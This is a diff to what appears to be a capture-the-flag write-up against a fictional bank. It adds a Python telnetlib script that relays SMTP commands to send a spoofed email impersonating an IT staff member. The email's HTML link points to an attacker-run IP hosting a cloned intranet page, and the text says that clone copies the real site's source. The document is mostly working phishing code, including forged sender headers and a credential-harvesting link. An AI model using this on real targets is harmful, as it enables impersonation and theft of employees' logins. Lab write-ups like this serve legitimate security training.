@@ -279,21 +279,68 @@ To work with the Telecom service, which can only take one line at a time, I've w
 
 ```python
 
+import telnetlib
+
+mailHost="80.69.175.118\n\r"
+mailPort="25\n\r"
+TChost="kouvostopankki.fi"
+TCport=42851
+
+pinja="pinja.pirivirkkala@kouvostopankki.fi"
+amadea="amadea.harjumotto@kouvostopankki.fi"
+
+elhoCMD=f"EHLO {TChost}\n\r"
+tlsCMD='STARTTLS\n\r'
+fromCMD=f'MAIL FROM: {pinja}\n\r'
+toCMD=f'RCPT TO: {amadea}\n\r'
+
+payload='''Subject: Re: Spam issues
+From: Pinja Pirivirkkala <pinja.pirivirkkala@kouvostopankki.fi>
+To: =?UTF-8?Q?Amadea_Harjum=c3=b6tt=c3=b6?=
+ <amadea.harjumotto@kouvostopankki.fi>
+Date: Wed, 13 Sep 2023 21:41:19 +0300
+References: <c5998c26-14fd-bd3f-c95e-6ac5099a7ff3@kouvostopankki.fi>
+ <99ffe330-8052-fc37-18f8-f7e253600ccf@kouvostopankki.fi>
+ <e8e8137c-a43f-0eae-f41a-ac25fc533afd@kouvostopankki.fi>
+In-Reply-To: <e8e8137c-a43f-0eae-f41a-ac25fc533afd@kouvostopankki.fi>
+
+<!DOCTYPE html>
+<html>
+<body>
+    <p>Hello again!</p>
+    <a href="http://82.181.205.192:9001/index.html">Heres intranet address for you.</a>
+    <p>Stay safe!</p>
+    <br>
+    <p>Warm regards,</p>
+<p>Pinja Pirivirkkala</p>
+<p>IT Department</p>
+<p>Kouvostopankki</p>
+</body>
+</html>
+
+.
+'''
+
 try:
     tn = telnetlib.Telnet(TChost, TCport, timeout=10)
 except Exception as e:
     print(e)
 
+
 welcome_msg=tn.read_until(b'Target address:', timeout=20).decode()
 print(welcome_msg)
 tn.write(mailHost.encode())
 
+
+
 x=tn.read_until(b'port:', timeout=2)
 tn.write(mailPort.encode())
+print(x)
 
 x=tn.read_until(b'transmission):', timeout=2)
 
 tn.write(elhoCMD.encode())
+
 x=tn.read_until(b'Sending data: ', timeout=2)
 
 tn.write(fromCMD.encode())
@@ -305,12 +352,12 @@ x=tn.read_until(b'Sending data: ', timeout=2)
 # Start sending data:
 tn.write(b"DATA\n\r")
 x=tn.read_until(b'Sending data: ', timeout=2)
+print(x)
 
 for line in payload.split("\n"):
     tn.write((line+"\n\r").encode())
     waitingFor=f"Sending data: {line}"
     _=tn.read_until(waitingFor.encode(), timeout=3)
-print("All done..")
 ```
 As for the server, I've ensured that the phishing address closely mimics intranet.kouvostopankki.fi by copying its source code.
 ![local_intranet](pix/image-20.png)<br>
